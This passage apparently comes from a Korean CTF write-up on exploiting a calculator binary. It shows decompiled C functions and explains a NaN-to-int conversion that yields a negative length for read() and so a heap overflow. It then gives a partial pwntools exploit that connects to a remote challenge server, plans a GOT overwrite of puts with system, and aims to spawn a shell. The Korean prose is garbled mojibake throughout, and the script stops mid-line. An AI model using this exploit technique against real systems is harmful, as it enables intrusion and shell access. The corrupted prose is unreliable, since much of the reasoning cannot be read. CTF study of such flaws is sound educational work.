class="number">0x138</span>uLL);</span><br><span class="line">setup();</span><br><span class="line">v3 = cal_num;</span><br><span class="line">v3-&gt;_int32 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v4 = cal_num;</span><br><span class="line">v4-&gt;_int33 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v5 = cal_num;</span><br><span class="line">v5-&gt;_int34 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br><span class="line">v6 = cal_num;</span><br><span class="line">v6-&gt;_float35 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v7 = cal_num;</span><br><span class="line">v7-&gt;_float36 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v8 = cal_num;</span><br><span class="line">v8-&gt;_float37 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br></pre></td></tr></table></figure><p><code>setup()</code> í•¨ìˆ˜ëŠ” ì•ˆë´ë„ ë˜ëŠ” í•¨ìˆ˜ë‹¤. ìŠ¤í¬ë¥¼ í•˜ìžë©´ <code>*cal_num-&gt;_int34</code>ì™€ <code>*cal_num-&gt;_float37</code>ì„ ì£¼ì‹œí•´ì•¼ í•œë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Banner();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v10);</span><br><span class="line">    <span class="keyword">switch</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Interger_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Real_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        overflow();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Number_change();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Print_number();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Print_Note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê¸°ëŠ¥ì´ 6ê°€ì§€ê°€ ìžˆìœ¼ë©° ë‚´ê°€ ì ì€ ìˆ«ìžì— ë”°ë¼ ê° ê¸°ëŠ¥ì´ ì‹¤í–‰ëœë‹¤. ì¼ë‹¨ ì·¨ì•½ì ì„ ì°¾ì•„ì•¼ í•˜ë‹ˆê¹Œ ì·¨ì•½ì ì¼ ê²ƒ ê°™ì€ ê²ƒë“¤ ìœ„ì£¼ë¡œ ë¹ ë¥´ê²Œ ì‚´íŽ´ë´¤ë‹¤. ì²˜ìŒì— í•˜ë‚˜í•˜ë‚˜ì”© ë¹ ë¥´ê²Œ ì—´ì–´ë³´ê³  ì„¸ ë²ˆì§¸ ê¸°ëŠ¥ í•¨ìˆ˜ë¥¼ ë³´ê³  ë‹¤ì‹œ ì²« ë²ˆì§¸ì™€ ë‘ ë²ˆì§¸ í•¨ìˆ˜ë¥¼ ì‚´íŽ´ë´¤ë‹¤.</p><p>ì„¸ ë²ˆì§¸ ê¸°ëŠ¥ í•¨ìˆ˜ëŠ” <code>overflow</code> ë‚  ê²ƒ ê°™ì´ ìƒê²¨ì„œ ë³´ìžë§ˆìž <code>overflow</code>ë¡œ í•¨ìˆ˜ ëª…ì„ ë°”ê¾¸ì–´ì£¼ì—ˆë‹¤. (ctfë‹ˆê¹Œ ì—¬ê¸°ì„œ overflowê°€ ë‚˜ì•¼ ë­”ê°ˆ í•  ìˆ˜ ìžˆê² ë‹¤ê³  ìƒê°í–ˆë‹¤.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)cal_num-&gt;_int34 || *cal_num-&gt;_float37 != <span class="number">0.0</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, cal_num, *(<span class="type">unsigned</span> <span class="type">int</span> *)cal_num-&gt;_int34);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Interger_cal()</code>í•¨ìˆ˜ì—ì„œëŠ” ì·¨ì•½ì ì¼ ê²ƒì²˜ëŸ¼ ìƒê¸´ê²Œ ì•ˆë³´ì˜€ë‹¤. í•˜ë‚˜ íŠ¹ì§•ì´ ìžˆë‹¤ë©´ í•œ ìˆ˜ì‹ì„ ì‚¬ìš©ìžë¡œë¶€í„° ìž…ë ¥ë°›ê³  ê·¸ ìˆ˜ì‹ì— ëŒ€í•œ ì—°ì‚°ì„ ì§„í–‰í•˜ëŠ”ë° ì—°ì‚° ê²°ê³¼ê°€ <code>*cal_num-&gt;_int34</code>ì— ë‹´ê¸´ë‹¤ëŠ” ê²ƒì´ë‹¤. <code>int</code> ì—°ì‚° ê²°ê³¼ê°€ <code>int</code> íƒ€ìž…ì˜ ë³€ìˆ˜ì— ë‹´ê¸°ê³  ìŒìˆ˜ ì—°ì‚°ë„ ìž˜ ì˜ˆì™¸ì²˜ë¦¬ê°€ ë˜ì–´ìžˆì–´ì„œ ì¼ë‹¨ ë„˜ì–´ê°”ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Real_cal</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Real cal&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *cal_num-&gt;_float37 == <span class="number">0.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1f %c %1f&quot;</span>, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s2) )</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">2</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)cal_num-&gt;_int34 = (<span class="type">int</span>)(<span class="type">float</span>)(*cal_num-&gt;_float35 - *cal_num-&gt;_float36); <span class="comment">// [*]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">4</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *cal_num-&gt;_float37 = *cal_num-&gt;_float35 / *cal_num-&gt;_float36; <span class="comment">// [**]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">    Print_Note();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">    Number_Check(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> ë¥¼ ë³´ìž. ì²˜ìŒì— ì´ í•¨ìˆ˜ë¥¼ ë³´ê³  ì €ê¸°ì„œ ë¬´ì¡°ê±´ íƒ€ìž… ì»¨í“¨ì ¼ì´ ë‚  ê²ƒì´ë¼ ìƒê°í–ˆë‹¤. ì™œëƒë©´ float ì—°ì‚° ê²°ê³¼ë¥¼ intì— ë‹´ìœ¼ë©´ ë§¤ìš°ë§¤ìš° í° ìˆ˜ê°€ ë‹´ê¸°ê¸° ë–„ë¬¸ì´ë‹¤. í•˜ì§€ë§Œ ë‚´ê°€ <code>scanf(&quot;%1f %c %1f&quot;, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</code> ì´ êµ¬ë¬¸ì„ ìž˜ëª» ì´í•´í•˜ê³  ìžˆì—ˆë‹¤. <code>%1f</code>ì˜ ì´ë¯¸ëŠ” ì •ìˆ˜í˜•ìœ¼ë¡œ í•œ ìžë¦¬ë§Œ ìž…ë ¥ë°›ê² ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. ë‚˜ëŠ” ì†Œìˆ˜ì  í•œìžë¦¬ì¸ ì¤„ ì•Œê³  ë””ë²„ê¹…í•´ë³´ë©´ì„œ ì˜ë¬¸ì´ ë„ˆë¬´ë‚˜ ë§Žì•˜ë‹¤.</p><p>ì°¸ê³ ë¡œ <code>float</code> ì—°ì‚°ì„ í•œë‹¤ëŠ” ê²ƒì€ ì–´ì…ˆë¸”ë¦¬ë¥¼ ë³´ê³  ë°”ë¡œ íŒŒì•…í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F0D                 mov     rax, cs:_ZL7cal_num._int ; cal_num</span><br><span class="line">.text:0000000000400F14                 mov     rax, [rax+110h]</span><br><span class="line">.text:0000000000400F1B                 cvttss2si rdx, xmm0</span><br><span class="line">.text:0000000000400F20                 mov     [rax], edx</span><br></pre></td></tr></table></figure><p><code>cvttss2si</code> ì™€ ê°™ì€ (ë‚˜ì—ê²Œ ìƒëŒ€ì ìœ¼ë¡œ ëœ ìµìˆ™í•œ) ì–´ì…ˆë¸”ë¦¬ ì—°ì‚°ì€ <code>float</code> ì—°ì‚°ì—ì„œ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì´ë‹¤.</p><p>ê·¸ë¦¬ê³  <code>Number_change</code>ë¼ëŠ” ìˆ˜ìƒí•œ í•¨ìˆ˜ê°€ ë³´ì—¬ì„œ ë°”ë¡œ í™•ì¸í–ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *<span class="title function_">Number_change</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(cal_num-&gt;_float38) = *cal_num-&gt;_int34;</span><br><span class="line">  *cal_num-&gt;_int34 = *cal_num-&gt;_float37; <span class="comment">// [*]</span></span><br><span class="line">  *cal_num-&gt;_float37 = SLODWORD(cal_num-&gt;_float38); </span><br><span class="line">  result = *cal_num-&gt;_int34;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = cal_num-&gt;_int34;</span><br><span class="line">    --*result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ëŒ€ë†“ê³  <code>float</code> íƒ€ìž…ì˜ ê°’ì„ <code>int</code> íƒ€ìž…ì˜ ë³€ìˆ˜ë¡œ ì˜®ê²¨ì¤€ë‹¤. ì—¬ê¸°ì„œ <code>type confusion</code>ì´ ë°œìƒí•  ê°€ëŠ¥ì„±ì´ ìžˆë‹¤. ê·¸ëŸ¬ë‚˜.. <code>float</code> ì—°ì‚°ì„ í•˜ë˜ <code>Real_cal</code> í•¨ìˆ˜ì—ì„œëŠ” ì •ìˆ˜ í•œìžë¦¬ë¡œ ê³„ì‚°í•˜ê¸° ë•Œë¬¸ì— ë¬´ì˜ë¯¸í•˜ë‹¤ê³  ìƒê°í–ˆë‹¤. ì—¬ê¸°ì„œ ì˜¤ëžœ ì‹œê°„ ê³ ë¯¼ì„ í•˜ë‹¤ê°€ ì˜ˆì „ì— <code>Chrome 1-day</code> ë¶„ì„í–ˆë˜ ê²ƒì´ ë– ì˜¬ëžë‹¤. ì •í™•ížˆ ë­”ì§€ëŠ” ê¸°ì–µ ì•ˆë‚˜ëŠ”ë° ì—°ì‚° ê²°ê³¼ê°€ <code>NaN</code>ì´ ë‚˜ì™€ì„œ <code>OOB</code>ê°€ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ ìžˆì—ˆë‹¤. <code>NaN</code>ì€ <code>0/0</code>ê°™ì€ ê²ƒì„ í•˜ë©´ ë‚˜ì˜¨ë‹¤. <code>Not a Number</code>ë¼ëŠ” ëœ»ì´ë‹¤. </p><p>ì•„ë¬´íŠ¼ ë°”ë¡œ ì•„ëž˜ ë¡œì§ìœ¼ë¡œ í…ŒìŠ¤íŠ¸ë¥¼ ì§„í–‰í–ˆê³  <code>overflow</code>ë¥¼ íŠ¸ë¦¬ê±° í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><ol><li><code>Real_Cal</code>ì—ì„œ <code>0/0</code> ìž…ë ¥</li><li><code>Number_Change</code> í•¨ìˆ˜ -&gt; ì—¬ê¸°ì„œ floatì˜ <code>NaN</code>ì´ intë¡œ ë„˜ì–´ê°€ëŠ”ë° 0ë³´ë‹¤ ìž‘ê¸° ë•Œë¬¸ì— ë¬¸ì œ ë¡œì§ì— ë”°ë¼ -1ì„ í•¨</li><li><code>overflow</code> í•¨ìˆ˜ë¥¼ í†µí•´ <code>overflow</code> ë°œìƒ -&gt; -1ì€ <code>read</code> ì„¸ ë²ˆì§¸ ì¸ìžë¡œ ë“¤ì–´ê°€ë©´ì„œ <code>unsigned int</code>ë¡œ í˜•ë³€í™˜ë˜ê¸° ë•Œë¬¸ì— ë§¤ìš° í° ìˆ˜ê°€ ë˜ì–´ <code>overflow</code>ê°€ ë°œìƒí•œë‹¤.</li></ol><p>í•´ë‹¹ ê³¼ì •ì€ ë””ë²„ê¹…ì„ í•˜ë©´ì„œ ì´í•´í•˜ì˜€ë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ì·¨ì•½ì  íŠ¸ë¦¬ê±°ë„ ê½¤ ê³ ìƒì„ í–ˆëŠ”ë° ìµìŠ¤í•  ë•Œë„ ê³ ìƒì„ ì¡°ê¸ˆ í–ˆë‹¤. <code>OOB</code>ê°€ ë°œìƒí•˜ëŠ”ë° leakë„ í•´ì•¼í•˜ê³  ì–´ë– í•œ í•¨ìˆ˜ì˜ gotë¥¼ system í•¨ìˆ˜ë¡œ ë®ì–´ì•¼í•˜ê³  ì–´ë”˜ê°€ì— â€˜&#x2F;bin&#x2F;sh\x00â€™ ì¨ì•¼í•˜ëŠ”ë° ì–´ë””ì— ì“°ì§€.. ëž€ ìƒê°ì´ ë™ì‹œì— ë“¤ì–´ì„œ í˜¼ëž€ìŠ¤ëŸ¬ì› ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_number</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Print Number&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 1. %d\n&quot;</span>, *cal_num-&gt;_int32);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 2. %d\n&quot;</span>, *cal_num-&gt;_int33);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Result %d\n&quot;</span>, *cal_num-&gt;_int34);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 1. %f\n&quot;</span>, *cal_num-&gt;_float35);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 2. %f\n&quot;</span>, *cal_num-&gt;_float36);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Float Result %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ mainì˜ 6ê°€ì§€ ê¸°ëŠ¥ ì¤‘ì— ì´ëŸ° ê²ƒì´ ìžˆì—ˆê³ , ë‚˜ëŠ” í˜„ìž¬ <code>cal_num</code>ì— overflowë¥¼ ë°œìƒì‹œì¼œ ìž…ë ¥ì„ í•  ìˆ˜ ìžˆìœ¼ë‹ˆ ìœ„ì— ë³´ì´ëŠ” ì € ê°’ ì¦‰, <code>*cal_num-&gt;_int32</code>ë‚˜ <code>*cal_num-&gt;_int33</code>ì™€ ê°™ì€ ê°’ë“¤ì„ ë®ì„ ìˆ˜ ìžˆë‹¤. ì´ ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ libc leakì„ í•  ìˆ˜ ìžˆë‹¤. ì£¼ì˜í•´ì•¼í•  ì ì€ ì´ê²Œ intë¼ì„œ 4ë°”ì´íŠ¸ì”© ëŠì–´ì ¸ì„œ leakì´ ëœë‹¤. í•˜ìœ„ 4ë°”ì´íŠ¸ ì¶œë ¥ê°’ì´ ë•Œë¡œ ìŒìˆ˜ê°€ ë  ë•Œë„ ìžˆì–´ì„œ 0ë³´ë‹¤ ì´ìƒì¼ ë•Œë§Œ ê±¸ëŸ¬ì£¼ì—ˆë‹¤. ì•„ë‹ˆë©´ ê·¸ëƒ¥ ì˜ˆì™¸ë¥¼ ê°•ì œë¡œ ë°œìƒì‹œì¼œ ë‹¤ì‹œ ì—°ê²°í•˜ì˜€ë‹¤. </p><p>ì´ëŸ°ì‹ìœ¼ë¡œ <code>libc base</code>ë¥¼ ì •ìƒì ìœ¼ë¡œ êµ¬í•  ìˆ˜ ìžˆê³  ì´ì œ <code>ì–´ë– í•œ í•¨ìˆ˜</code>ë¥¼ <code>system</code> í•¨ìˆ˜ë¡œ ë®ì–´ì•¼ í•œë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_Note</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(cal_num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê¸°ëŠ¥ ì¤‘ì— ì´ëŸ° ê¸°ëŠ¥ì´ ìžˆì—ˆê³ , <code>puts</code> í•¨ìˆ˜ë¥¼ <code>system</code> í•¨ìˆ˜ë¡œ ë®ê³  <code>cal_num</code>ì´ ìš°ë¦¬ ìž…ë ¥ê°’ì´ë‹ˆê¹Œ â€˜&#x2F;bin&#x2F;sh\x00â€™ì„ ì‰½ê²Œ ë„£ì–´ ì‰˜ì„ ë”°ìžê³  ìƒê°í–ˆë‹¤. ìž¬ë°Œê²Œë„ ì´ í•¨ìˆ˜ëŠ” <code>Interger_cal</code> í•¨ìˆ˜ê°€ ì¢…ë£Œë  ë–„ ì¯¤ í˜¸ì¶œì´ ëœë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*cal_num-&gt;_int34 = *cal_num-&gt;_int32 + *cal_num-&gt;_int33;</span><br></pre></td></tr></table></figure><p><code>Interger_cal</code> í•¨ìˆ˜ ìƒë‹¨ì—ì„  ì‚¬ìš©ìž ìž…ë ¥ì— ë”°ë¼ ì´ëŸ¬í•œ ì—°ì‚°ì„ ìˆ˜í–‰í•œë‹¤. ì´ê±¸ ì´ìš©í•˜ì—¬ <code>puts@got</code>ë¥¼ <code>system</code> í•¨ìˆ˜ë¡œ ë®ì„ ìˆ˜ ìžˆê² ë‹¤ê³  ìƒê°í–ˆë‹¤. ë¨¼ì € <code>overflow</code> í•¨ìˆ˜ì—ì„œ í”¼ ì—°ì‚°ìž ë‘ ê°œì— <code>puts@got</code>ë¥¼ 4ë°”ì´íŠ¸ì”© ìž˜ë¼ì„œ ë„£ì–´ë†“ê³  <code>Interger_cal</code> í•¨ìˆ˜ì—ì„œ <code>puts@got</code>ì—ë‹¤ê°€ ê°’ì„ ì“¸ ìˆ˜ ìžˆë‹¤. ì´ ë•Œ ì¤‘ìš”í•œ ê²ƒì€ 4ë°”ì´íŠ¸ì”© ìž˜ ìž˜ë¼ì„œ ë„£ì–´ì¤˜ì•¼í•œë‹¤ëŠ” ê²ƒì´ë‹¤. ê·¸ëŸ¼ ì´ì œ ì‰˜ì„ íšë“í•  ìˆ˜ ìžˆë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0 / 0&#x27;</span>) <span class="comment"># nan</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>)) <span class="comment"># float -&gt; int</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span></span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">4</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 1.&#x27;</span>)</span><br><span class="line">        got1 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">        info(<span class="built_in">hex</span>(got1))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 2.&#x27;</span>)</span><br><span class="line">        got2 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment"># 7f??</span></span><br><span class="line">        info(<span class="built_in">hex</span>(got2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> got1 &gt; <span class="number">0</span>:</span><br><span class="line">            leak = <span class="built_in">hex</span>(got2) + <span class="built_in">hex</span>(got1)[<span class="number">2</span>:]</span><br><span class="line">            